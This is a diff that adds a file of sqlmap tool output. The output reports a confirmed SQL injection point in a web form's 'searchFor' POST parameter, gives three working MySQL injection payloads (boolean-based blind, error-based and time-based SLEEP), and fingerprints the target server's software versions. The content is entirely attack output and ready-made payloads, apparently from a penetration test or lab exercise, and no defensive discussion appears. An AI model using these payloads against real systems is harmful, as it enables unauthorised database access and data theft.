@@ -1,0 +1,18 @@
+sqlmap identified the following injection point(s) with a total of 770 HTTP(s) requests:
+---
+Parameter: searchFor (POST)
+    Type: boolean-based blind
+    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: searchFor=SNmT' AND EXTRACTVALUE(5264,CASE WHEN (5264=5264) THEN 5264 ELSE 0x3A END) AND 'uCZW'='uCZW&goButton=go
+
+    Type: error-based
+    Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
+    Payload: searchFor=SNmT' OR GTID_SUBSET(CONCAT(0x717a627a71,(SELECT (ELT(8765=8765,1))),0x716b627671),8765) AND 'Ncwd'='Ncwd&goButton=go
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchFor=SNmT' AND (SELECT 7669 FROM (SELECT(SLEEP(5)))EHQE) AND 'JIVY'='JIVY&goButton=go
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
